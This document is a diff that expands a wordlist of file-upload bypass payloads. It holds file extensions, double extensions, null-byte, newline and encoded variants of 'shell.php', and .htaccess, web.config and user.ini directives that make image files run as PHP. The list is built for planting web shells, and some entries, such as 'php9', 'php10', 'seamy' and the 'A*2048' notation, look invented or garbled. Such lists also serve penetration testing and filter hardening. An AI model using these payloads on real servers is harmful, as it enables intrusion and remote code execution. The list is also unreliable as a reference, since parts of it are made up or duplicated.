@@ -1,20 +1,232 @@
-php
+# PHP variants
+php2
 php3
 php4
 php5
+php6
 php7
+php8
+php9
+php10
 phtml
-phar
-inc
-php.jpg
-php.png
-php.gif
-php;.jpg
-php%00.jpg
-php..jpg
-php.
-pHp
-PhP
-phtml.jpg
-phtml.png
+phps
+phpt
+pht
+phtml3
+phtml5
+phps3
+phps5
+inc.php
+class.php
+module.php
+fpm
+php-fpm
 
+# ASP/ASP.NET extended
+aspx.cs
+aspx.vb
+aspx.axd
+asbx
+ashx.asmx
+asmx.resx
+svc
+xamlx
+xoml
+xsp
+asa.cer
+cdx.asp
+htr
+idc
+stm
+ssi
+shtml.asp
+
+# JSP/Java extended
+jspa
+jspc
+jspx.xx
+jspf.inc
+jsp.old
+jsp.bak
+jsp.swp
+tagx
+jspx.tag
+jsf.jsp
+faces
+seamy
+jws
+jwsvc
+
+# ColdFusion extended
+cfc.cfm
+cfm.swf
+cfml.cfm
+cfm.cfc
+cfcs
+cfswf
+cfm.res
+cfml.inc
+
+# Node.js server-side
+jsc
+jsx
+mjs
+cjs
+jsonp
+js.php
+node.php
+server.js
+app.js
+index.js
+main.js
+
+# Ruby/Python/Perl additional
+rbx
+ruby
+rhtml.erb
+erb
+rake
+rake.rb
+py3
+pyz
+pyzw
+pyd
+pyc
+pyo
+pyw
+cgi.pl
+cgi.rb
+plx
+pmx
+al.pl
+ph.cgi
+
+# SSI more
+stm
+shtml.shtm
+shtml.inc
+shtml.stm
+html.shtml
+html.stm
+shtm.old
+stm.old
+.shtml.bak
+
+# Archive bypasses
+phar.zip
+phar.tar
+phar.gz
+phar.bz2
+phar.phar
+phar.phar.jpg
+zip.php
+tar.php
+gz.php
+bz2.php
+zlib.php
+zip.phtml
+tar.phtml
+
+# Lesser-known (WAF misses)
+asa
+asax
+ascx
+ashx
+asmx
+aspx
+asr
+asa
+cer
+cdx
+ida
+idq
+htr
+stm
+ssi
+shtml
+htc
+htr
+idc
+htw
+shtm
+stm
+ssi
+shtml
+htaccess
+htpasswd
+user.ini
+.htaccess
+.htpasswd
+web.config
+web.xml
+.user.ini
+
+# Unicode / UTF-8 overlong
+%c0%ae%c0%ae
+%c0%af
+%e0%40%aa%2f
+%c1%9c
+%c0%ae.php.jpg
+%c1%9c.php.jpg
+
+# Newline/tab variations
+shell.php%0d%0a.jpg
+shell.php%0a%0d%0a.jpg
+shell.php%09%09.jpg
+shell.php%0aContent-Type: image/jpeg
+shell.php%0a%0d%0a--boundary
+
+# URL-encoded path traversal + extension
+..%2fphp%2f.jpg
+..%5cphp%5c.jpg
+%2e%2e%2fphp%2e%2e.jpg
+%2e%2e%5cphp%2e%2e.jpg
+
+# Chunking / overlap
+shell.php.jpg.png.gif.bmp
+shell.p.h.p.jpg
+shell.p%68p.jpg
+s h e l l . p h p . j p g
+
+# Multiple separators
+shell.php:jpg.png
+shell.php;png.gif
+shell.php%00png%00jpg
+shell.php%0ajpg%0apng
+
+# No extension tricks
+shell
+shell.
+shell...
+shell.... (Windows multiple dots)
+
+# Config file contents (upload as .htaccess or web.config)
+AddType application/x-httpd-php .gif .jpg .png
+<handlers><add name="php" path="*.gif" verb="*" modules="FastCgiModule" scriptProcessor="php-cgi.exe" resourceType="File" /></handlers>
+auto_prepend_file = shell.jpg
+
+# Emoji / non-ASCII
+shell😁.php.jpg
+shell🤣.phtml
+shell😎.phar
+shell🔥.inc
+
+# Long filename overflow
+A*2048.php.jpg
+A*4096.php.jpg
+shell.php + 5000 spaces + .jpg
+
+# Double extensions (already in your list, but extra)
+shell.php.jpg
+shell.php.png
+shell.php.gif
+shell.php.bmp
+shell.php.txt
+shell.php.log
+shell.php.bak
+shell.php.old
+
+# PHP short tags (content, not extension – but useful)
+<?= ?> 
+<% %> 
+<script language="php"> </script>
